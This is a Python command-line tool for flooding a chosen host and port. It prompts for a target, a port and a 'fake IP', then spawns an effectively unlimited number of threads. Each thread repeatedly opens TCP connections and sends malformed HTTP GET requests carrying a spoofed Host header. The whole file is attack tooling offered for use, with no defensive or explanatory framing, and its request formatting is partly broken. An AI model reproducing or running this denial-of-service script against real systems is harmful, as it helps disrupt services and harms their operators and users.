import os
import time
import sys
from colorama import Fore
import platform
import socket
import threading
import banner

banner.cls_clear()
banner._baner_()
print("\n")
banner.print_ewe(Fore.WHITE +"*)"+Fore.CYAN + " Enter IP or Domain Target" + Fore.WHITE + " >>> ")
target = input()
if target == None or target == "":
        time.sleep(1)
        banner.print_ewe(Fore.RED + "\n-) your input is none")
        sys.exit()
else:
        counter = 0
        for i in target:
                if i == ".":
                        counter += 1
        if counter == 3:
                pass
        else:   
                try:
                        target = socket.gethostbyname(target)
                except:
                        time.sleep(1)
                        banner.print_ewe(Fore.RED + "\n-) your target is not found")
                        sys.exit()
try:
        banner.print_ewe(Fore.WHITE +"*)"+Fore.CYAN + " Enter port for attack" + Fore.WHITE + " >>> ")
        port = int(input())
except:
        time.sleep(1)
        banner.print_ewe(Fore.RED + "\n-) your input is not found")
        sys.exit()
if port == None or port == "":
        time.sleep(1)
        banner.print_ewe(Fore.RED + "\n-) your input is none")
        sys.exit()
banner.print_ewe(Fore.WHITE +"*)"+Fore.CYAN + " Enter fake IP for attack" + Fore.WHITE + " >>> ")
fake_ip = input()
if fake_ip == None or fake_ip == "":
        time.sleep(1)
        banner.print_ewe(Fore.RED + "\n-) your input is none")
        sys.exit()
else:
        counter = 0
        for i in fake_ip:
                if i == ".":
                        counter +=1
        if counter == 3:
                pass
        else:
                time.sleep(1)
                banner.print_ewe(Fore.RED + "\n-) your fake ip is not found")
                sys.exit()
print(Fore.GREEN + f"\nSTART ATTACK\nIP TARGET >>>{target}\nPORT FOR ATTACK >>> {port}\nFAKE IP >>> {fake_ip}\n\n")
def attack():
        while True:
            try:
                server = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
                server.connect((target , port))
                server.sendto(("GET /" + target +"HTTP/1.1\r\n").encode("ascii") ,(target , port))
                server.sendto(("Host : " + fake_ip + "\r\n\r\n").encode("ascii"),(target,port))
                server.close()
                print(Fore.GREEN + f"attack form {fake_ip} to {target} | time : {time.ctime()}")
            except:
                print(Fore.RED + f"attack form {fake_ip} to {target} | time : {time.ctime()}")

for i in range(99999999999999999999999999999999999999999999):
    thread = threading.Thread(target=attack)
    thread.start()
